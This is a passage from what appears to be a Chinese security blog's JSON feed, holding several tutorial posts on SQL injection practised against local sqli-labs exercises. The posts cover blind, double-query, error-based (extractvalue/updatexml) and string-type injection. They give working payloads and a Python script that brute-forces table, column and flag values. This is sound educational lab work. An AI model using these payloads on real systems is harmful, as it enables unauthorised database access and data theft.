class=\"line\">1-101</span><br><span class=\"line\">2-109</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-105</span><br><span class=\"line\">5-108</span><br><span class=\"line\">6-115</span><br><span class=\"line\">第一个表名emails</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;)) %23</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=20) %23</span><br><span class=\"line\">1-102</span><br><span class=\"line\">2-108</span><br><span class=\"line\">3-97</span><br><span class=\"line\">4-103</span><br><span class=\"line\">第二个表名flag</span><br><span class=\"line\"></span><br><span class=\"line\">#5.爆破表中的列</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&#x27;flag&#x27; limit 1,1),1,1))=20) %23</span><br><span class=\"line\">爆破脚本</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&#x27;flag&#x27; limit 0,1),%d,1))=ord(&#x27;%s&#x27;)) %23</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#6.爆破值</span><br><span class=\"line\">http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challeng.flag where flag=&#x27;flag3&#x27; limit 1,1),1,1))=20) %23</span><br><span class=\"line\">1-103</span><br><span class=\"line\">2-105</span><br><span class=\"line\">3-114</span><br><span class=\"line\">gir</span><br></pre></td></tr></table></figure>\n<h5 id=\"附爆破脚本\"><a class=\"markdownIt-Anchor\" href=\"#附爆破脚本\">#</a> 【附】爆破脚本</h5>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_name</span>():</span><br><span class=\"line\">\tname = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:</span><br><span class=\"line\">\t\t\turl = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(url+<span class=\"string\">&#x27;%23&#x27;</span>)</span><br><span class=\"line\">\t\t\tr = requests.get(url+<span class=\"string\">&#x27;%23&#x27;</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;Username: kevin&#x27;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">\t\t\t\tname = name+i</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(name)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;FINAL target_name:&#x27;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\">target_name()</span><br></pre></td></tr></table></figure>\n<h5 id=\"脚本爆破数据库名\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破数据库名\">#</a> 脚本爆破数据库名</h5>\n<p>url 为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001120214845.png\" alt=\"image-20221001120214845\"></p>\n<h5 id=\"脚本爆破表名\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破表名\">#</a> 脚本爆破表名</h5>\n<p>修改 url 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = &quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot; %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出第一个表名 <code>emails</code></p>\n<p><img src=\"image-20221001115314470.png\" alt=\"image-20221001115314470\"></p>\n<p>修改 <code>limit 1,1</code>  爆出第二个表名 <code>flag</code></p>\n<p><img src=\"image-20221001115353280.png\" alt=\"image-20221001115353280\"></p>\n<h5 id=\"脚本爆破列名\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破列名\">#</a> 脚本爆破列名</h5>\n<p>修改 url 为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出第一个列名 <code>flag</code></p>\n<p><img src=\"image-20221001114442930.png\" alt=\"image-20221001114442930\"></p>\n<p>修改 <code>limit 1,1</code>  爆出第二个列名 <code>value</code></p>\n<p><img src=\"image-20221001114318316.png\" alt=\"image-20221001114318316\"></p>\n<h5 id=\"脚本爆破值\"><a class=\"markdownIt-Anchor\" href=\"#脚本爆破值\">#</a> 脚本爆破值</h5>\n<p>修改 url 为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challenge.flag where flag=&#x27;flag3&#x27;),%d,1))=ord(&#x27;%s&#x27;))&quot;</span> %(j,i)</span><br></pre></td></tr></table></figure>\n<p>爆出当 <code>flag=flag3</code>  时的 <code>value</code>  值为 <code>gir</code></p>\n<p><img src=\"image-20221001115921853.png\" alt=\"image-20221001115921853\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/",
            "title": "双注入",
            "date_published": "2022-09-30T16:08:18.000Z",
            "content_html": "<h1 id=\"sql-注入之双注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之双注入\">#</a> SQL 注入之双注入</h1>\n<p>本篇使用双注入。</p>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"设置代理\"><a class=\"markdownIt-Anchor\" href=\"#设置代理\">#</a> 设置代理</h3>\n<p>还是 Less-11，我们挂上<strong> BurpSuit</strong> 代理，然后<strong> Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220930220638714.png\" alt=\"image-20220930220638714\"></p>\n<h3 id=\"确定注入类型和列数\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型和列数\">#</a> 确定注入类型和列数</h3>\n<p>我们输入 1 + 单引号。 <strong>不报错</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221056886.png\" alt=\"image-20220930221056886\"></p>\n<p>输入 1 + 单引号 + %23</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27;&quot; %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>报错， <code>&quot; #' and password='123456' LIMIT 0,1</code> 。</p>\n<p>由 #号后面跟着个单引号，这就说明第一个<strong> username 是使用单引号闭合的</strong>。</p>\n<p><img src=\"image-20220930221013645.png\" alt=\"image-20220930221013645\"></p>\n<p>使用 order by n 确定列数</p>\n<p>输入 2，不报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 2 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221434509.png\" alt=\"image-20220930221434509\"></p>\n<p>输入 3，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; order by 3 %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930221557671.png\" alt=\"image-20220930221557671\"></p>\n<p>综上，注入类型是<strong> POST 型单引号注入</strong>，且<strong>查询列数为 2</strong>。</p>\n<p>采用双注入时，我们需要使用到以下函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；</span><br><span class=\"line\"></span><br><span class=\"line\">floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。</span><br><span class=\"line\">Select floor(11.2); ----&gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|   floor(11.2)  |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\">|           11   |</span><br><span class=\"line\">+----------------+</span><br><span class=\"line\"></span><br><span class=\"line\">rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值</span><br><span class=\"line\">举例说明：select rand() from qs_ad_category;</span><br><span class=\"line\">结果为随机的浮点型小数：0.7450851357961866</span><br><span class=\"line\"></span><br><span class=\"line\">floor() 函数 配合 rand() 函数</span><br><span class=\"line\">由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866</span><br><span class=\"line\">而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。</span><br><span class=\"line\">例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：</span><br><span class=\"line\">select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。</span><br><span class=\"line\">若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。</span><br><span class=\"line\">count(1)：统计不为NULL 的记录。</span><br><span class=\"line\">count(*)：统计所有的记录（包括NULL）</span><br><span class=\"line\">count(字段)：统计该&quot;字段&quot;不为NULL 的记录。</span><br><span class=\"line\">count(DISTINCT 字段)：统计该&quot;字段&quot;去重且不为NULL 的记录。</span><br><span class=\"line\"></span><br><span class=\"line\">如果三者一起使用:</span><br><span class=\"line\">select 1,count(1) from information_schema.tables group by floor(rand(0)*2)</span><br><span class=\"line\">意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）</span><br></pre></td></tr></table></figure>\n<p>使用 group by floor (rand () *2)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220930223216903.png\" alt=\"image-20220930223216903\"></p>\n<p>可以看到，uname 和 password 位都被 select 的内容（1 和 2）代替。</p>\n<p>下面探究 group by、rand ()、count () 的组合使用的关系。</p>\n<h3 id=\"灵魂拷问一rand和rand0有什么区别\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问一rand和rand0有什么区别\">#</a> 灵魂拷问一：rand () 和 rand (0) 有什么区别？</h3>\n<p>使用 <code>rand() *2</code> ， <code>第一次</code> 。</p>\n<p><img src=\"image-20220930225234750.png\" alt=\"image-20220930225234750\"></p>\n<p>使用 <code>rand() *2</code> ， <code>第二次</code> 。</p>\n<p><img src=\"image-20220930225215910.png\" alt=\"image-20220930225215910\"></p>\n<p>使用 <code>rand() *2</code> ， <code>第三次</code> 。</p>\n<p><img src=\"image-20220930225250214.png\" alt=\"image-20220930225250214\"></p>\n<p>综合以上三次使用 rand ()*2 的情况，我们发现结果毫无规律，是真正的随机。</p>\n<p>使用 <code>rand(0) *2</code> ， <code>第一次</code> 、 <code>第二次</code> 、 <code>第三次</code> 都是下图：</p>\n<p><img src=\"image-20220930225429894.png\" alt=\"image-20220930225429894\"></p>\n<p>结果说明，使用 rand (0)*2 可以做到一种伪随机变化，会一直保持 011 011 011 这样的规律。</p>\n<h3 id=\"灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错\">#</a> 灵魂拷问二：为什么 select 1, count (1) from xxx group by floor (rand (0) * 2) 会报错？</h3>\n<p>我们需要知道先创建虚拟表，以下图 (其中 key 是 group by 后面跟随的内容【即主键】，不可重复)</p>\n<p><img src=\"image-20220930230206868.png\" alt=\"image-20220930230206868\"></p>\n<p>开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则 count (1) 字段直接加 1，</p>\n<p><img src=\"image-20220930230334615.png\" alt=\"image-20220930230334615\"></p>\n<p>由此看到 若是 key 存在的话就 + 1， 不存在的话就新建一个 key。</p>\n<p>但是 mysql 官方有给提示，查询的时候若是使用了 rand () 的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。</p>\n<p>由前文可知，floor (rand (0)*2) 的值是 011011011… 的规律。</p>\n<p>取第一条记录，取到的值是 0【 <code>第一次计算</code> 】。</p>\n<p><code>判断</code> ：虚表中发现 0 这个键值并不存在，那么，floor (rand (0)*2) 会被再次计算一次</p>\n<p>结果取到了 1【 <code>第二次计算</code> 】。将 key=1 插入虚表，这是第一条记录查询完毕。</p>\n<p><img src=\"image-20220930231052670.png\" alt=\"image-20220930231052670\"></p>\n<p>查询第二次记录，再次计算 floor (rand (0)*2)，发现结果为 1【 <code>第三次计算</code> 】。</p>\n<p>查询虚表，发现 1 这个键值已经存在，因此 floor (rand (0)*2) 不会再次计算，直接 count (1) 加 1，第二条记录查询完毕。</p>\n<p><img src=\"image-20220930231458853.png\" alt=\"image-20220930231458853\"></p>\n<p>查询第三条记录，再次计算 floor (rand (0)*2)，取值为 0【 <code>第四次计算</code> 】，查询虚表，发现键值没有 0，则再次计算 floor，取值为 1【 <code>第五次计算</code> 】</p>\n<p>而此时，1 这个主键已经存在于虚表中，新计算的值也为 1【 <code>第五次计算</code> 】，<strong>由于插入的 key 主键值必须唯一</strong>，新计算的 1 和主键 1 重复，因此插入的时候直接报错。</p>\n<h3 id=\"灵魂拷问三选择rand0而非rand的原因\"><a class=\"markdownIt-Anchor\" href=\"#灵魂拷问三选择rand0而非rand的原因\">#</a> 灵魂拷问三：选择 rand (0) 而非 rand () 的原因</h3>\n<p>简而言之，group by 插入进 &lt;key，count (1)&gt; 虚表的前提是 —— <code>当前的记录在虚表中不存在</code> 。</p>\n<p>白话文解释：当前的记录由于 011011011 这特殊规律导致 0 这个记录的在表中不存在，计算时总是被取值成 1 插入虚表，第一次还能插进来，但在第二次新插入进来的 1 又存在于虚表中，所以就报 “重复条目 “的错了。</p>\n<p>选择 <code>rand(0)x2</code>  是<strong>必会报错</strong>，而 <code>rand()x2</code>  就不一定了【可能报错、可能不报错】。</p>\n<p>因为通过上文解释，如果不是 011011 这个特殊规律，0 和 1 是都可以进到虚表中，如果都能进来，那就不会报错。</p>\n<p>因此，100% 报错须要 count ()，rand (0)*2、group by，三者缺一不可。</p>\n<h3 id=\"双注入走起\"><a class=\"markdownIt-Anchor\" href=\"#双注入走起\">#</a> 双注入走起</h3>\n<p>首先使用 concat 组合字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000024436.png\" alt=\"image-20221001000024436\"></p>\n<p>将 version 处替换成我们想要的 select 语句【注意，这里只能使用 limit 0,1 来进行输出爆破，group_concat 会爆出数据库信息失败】</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221001000515293.png\" alt=\"image-20221001000515293\"></p>\n<p>至此，双注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/",
            "title": "报错注入",
            "date_published": "2022-09-29T15:57:38.000Z",
            "content_html": "<h1 id=\"sql-注入之报错注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之报错注入\">#</a> SQL 注入之报错注入</h1>\n<p>本篇使用报错注入。</p>\n<p><code>注意</code> ：报错函数的使用中，第二个参数如果来自于查询语句，都是<strong>需要用小括号包裹起来的</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#使用 extractvalue(1, (select xxx))</span><br><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br><span class=\"line\"></span><br><span class=\"line\">#使用 updatexml(1, (select xxx), 1)</span><br><span class=\"line\">uname=1&#x27; union select 1, updatexml(1, concat(&#x27;%&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<h2 id=\"注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤\">#</a> 注入步骤</h2>\n<h3 id=\"设置代理\"><a class=\"markdownIt-Anchor\" href=\"#设置代理\">#</a> 设置代理</h3>\n<p>还是 Less-11，我们挂上<strong> BurpSuit</strong> 代理，然后<strong> Send To Reapeater</strong>。</p>\n<p><img src=\"image-20220929231322659.png\" alt=\"image-20220929231322659\"></p>\n<p>报错注入常使用的函数如下：</p>\n<p>①<strong>extractvalue</strong> (): 从目标 XML 中返回包含所查询值的字符串。</p>\n<p>例子：extractvalue (XML_document, XPath_string);</p>\n<p><code>第一个参数</code> ：XML_documentshi String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p><code>第二个参数</code> ：XPath_string (Xpath 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p>concat ()：返回结果为连接参数产生的字符串。</p>\n<p>②<strong>updatexml</strong> (): 更新 XML 信息</p>\n<p>例子：updatexml (XML_document, XPath_string, new_value);</p>\n<p><code>第一个参数</code> ：XML_document 是 String 格式，为 XML 文档对象的名称。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<p><code>第二个参数</code> ：XPath_string (XPATH 格式的字符串)。<strong>在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。</strong></p>\n<p><code>第三个参数</code> ：new_value, String 格式， 替换查找到的符合条件的数据。<strong>在报错注入中可以随意指定，比如 1 即可。</strong></p>\n<h3 id=\"确定注入类型和列数\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型和列数\">#</a> 确定注入类型和列数</h3>\n<p>通过单引号注入和 order by n 来<strong>确定注入类型</strong>和<strong>查询列数</strong>。</p>\n<p><img src=\"image-20220929232026560.png\" alt=\"image-20220929232026560\"></p>\n<h3 id=\"使用指定报错函数\"><a class=\"markdownIt-Anchor\" href=\"#使用指定报错函数\">#</a> 使用指定报错函数</h3>\n<p>那么我们就可构造：</p>\n<p>extractvalue (1, XPATH_string)，其中 XPATH_string 为 (select version ())</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, (select version())) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233031785.png\" alt=\"image-20220929233031785\"></p>\n<p>可以看到版本号被截断，信息不全。我们尝试调 concat () 函数使用 0x7e 字符拼接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929233343167.png\" alt=\"image-20220929233343167\"></p>\n<p>这里分割字符串可以换成 %，分割字符串的选择比较看运气，有时候后台会校验，所以多用 ASCII 来表示。<strong>比如波浪线的 ASCII 为 0x7e</strong></p>\n<p><img src=\"image-20220929233647634.png\" alt=\"image-20220929233647634\"></p>\n<h3 id=\"泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#泄露数据库信息\">#</a> 泄露数据库信息</h3>\n<p>准备泄露数据库的表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=1&#x27; union select 1, extractvalue(1, concat(&#x27;%&#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;passwd=123456&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>但是报了错， <code>Subquery returns more than 1 row</code> ，说明最后查询的 select 的列数超过了一列。</p>\n<p><img src=\"image-20220929233914430.png\" alt=\"image-20220929233914430\"></p>\n<p>我们需要<strong>使用 limit 0,1 限制一列输出</strong></p>\n<p><img src=\"image-20220929234118900.png\" alt=\"image-20220929234118900\"></p>\n<p>或者<strong>使用 group_concat 拼接成一列</strong></p>\n<p><img src=\"image-20220929234238245.png\" alt=\"image-20220929234238245\"></p>\n<p>同理，也使用 updatexml 进行报错注入</p>\n<p>构造时，因为我们关键是为了调用 <code>updatexml</code>  函数和使用 <code>第二个参数</code> 进行内容输出，因此<strong>第一个参数</strong>和<strong>第三个参数</strong>都是 **“无用”** 的，设置成 1 即可。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; union select 1, updatexml(1, concat(&#x27;</span><span class=\"operator\">%</span><span class=\"string\">&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=123456&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929234443551.png\" alt=\"image-20220929234443551\"></p>\n<p>至此，报错注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "字符型注入",
            "date_published": "2022-09-29T13:54:18.000Z",
            "content_html": "<h1 id=\"sql-注入之字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入之字符型注入\">#</a> SQL 注入之字符型注入</h1>\n<p>本篇使用字符型注入。</p>\n<h2 id=\"注入步骤单引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤单引号注入\">#</a> 注入步骤 (单引号注入)</h2>\n<p>由于 Less-1 从请求上看到是 GET 型，所以礼节性地输入个 id=1</p>\n<p><img src=\"image-20220929215708949.png\" alt=\"image-20220929215708949\"></p>\n<h3 id=\"尝试注入类型\"><a class=\"markdownIt-Anchor\" href=\"#尝试注入类型\">#</a> 尝试注入类型</h3>\n<p>输入 1’  来看看是否报错</p>\n<p><img src=\"image-20220929215814839.png\" alt=\"image-20220929215814839\"></p>\n<p>输入 22’  来看看是否报错</p>\n<p><img src=\"image-20220929215843779.png\" alt=\"image-20220929215843779\"></p>\n<p>那么， <code>'22'' LIMIT 0,1</code>  中，‘22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。</p>\n<h3 id=\"确定注入类型\"><a class=\"markdownIt-Anchor\" href=\"#确定注入类型\">#</a> 确定注入类型</h3>\n<p>闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、–+</p>\n<p>那么，我们尝试一下 #号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; #</span></span><br></pre></td></tr></table></figure>\n<p>不行，会报错，可能后台过滤了 #号。</p>\n<p><img src=\"image-20220929220358319.png\" alt=\"image-20220929220358319\"></p>\n<p>尝试 %23 也一样，就不再贴图了。</p>\n<p>我们最后尝试–+，成功。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220326957.png\" alt=\"image-20220929220326957\"></p>\n<p>由此，可以确定此题注入类型为字符型注入的<strong>单引号注入</strong>。</p>\n<h3 id=\"确定列数\"><a class=\"markdownIt-Anchor\" href=\"#确定列数\">#</a> 确定列数</h3>\n<p>使用 order by n 来确定有多少列。<strong>order by n</strong> 会以当前表中的 “<strong>第 n 列</strong>” 进行排序，如果<strong>第 n 列不存在</strong>，则会抛出 <code>Unknown column 'n' </code> 的异常。</p>\n<p>4 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220842238.png\" alt=\"image-20220929220842238\"></p>\n<p>3 列？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929220533059.png\" alt=\"image-20220929220533059\"></p>\n<p>不报错，则说明 <code>有3列</code> 。</p>\n<h3 id=\"构造联合查询泄露数据库信息\"><a class=\"markdownIt-Anchor\" href=\"#构造联合查询泄露数据库信息\">#</a> 构造联合查询泄露数据库信息</h3>\n<p>这回我们使用 <code>and 0</code>  来构造对于 id 的查询为假的条件</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-1</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">2</span><span class=\"string\">&#x27; and 0 union select 1, group_concat(table_name), database() from information_schema.tables where table_schema = database() --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220929221156300.png\" alt=\"image-20220929221156300\"></p>\n<h2 id=\"注入步骤双引号注入\"><a class=\"markdownIt-Anchor\" href=\"#注入步骤双引号注入\">#</a> 注入步骤 (双引号注入)</h2>\n<p>Less-4 是一道双引号注入的题目。</p>\n<p><img src=\"image-20220929221450837.png\" 